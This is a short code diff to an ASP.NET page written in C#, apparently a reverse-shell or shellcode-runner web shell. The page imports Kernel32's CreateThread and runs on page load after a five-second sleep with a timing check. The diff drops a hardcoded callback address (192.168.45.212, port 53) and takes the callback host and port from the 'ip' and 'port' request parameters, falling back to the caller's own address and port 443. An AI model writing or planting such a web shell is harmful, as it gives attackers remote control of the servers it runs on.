@@ -16,9 +16,17 @@
     [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);
     protected void Page_Load(object sender, EventArgs esfd)
     {
-        // USER CONFIG:
-        string RHOST = "192.168.45.212";
-        string RPORT = "53";
+        string RHOST = Request.ServerVariables["REMOTE_ADDR"];
+        if (!string.IsNullOrEmpty(Request["ip"]))
+        {
+            RHOST = Request["ip"];
+        }
+
+        string RPORT = "443";
+        if (!string.IsNullOrEmpty(Request["port"]))
+        {
+            RPORT = Request["port"];
+        }
 
         DateTime t1 = DateTime.Now;
         Sleep(5000);
